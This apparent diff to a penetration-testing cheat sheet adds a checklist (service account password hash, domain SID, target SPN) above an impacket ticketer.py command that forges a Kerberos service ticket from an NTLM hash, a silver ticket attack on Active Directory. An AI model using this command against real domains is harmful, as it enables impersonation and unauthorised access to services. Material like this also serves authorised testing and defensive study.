@@ -1,5 +1,9 @@
-#impacket
+Collect the following three pieces:
+• SPN password hash
+• Domain SID
+• Target SPN
 
+#impacket
 # To generate the TGS with NTLM
 python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
 
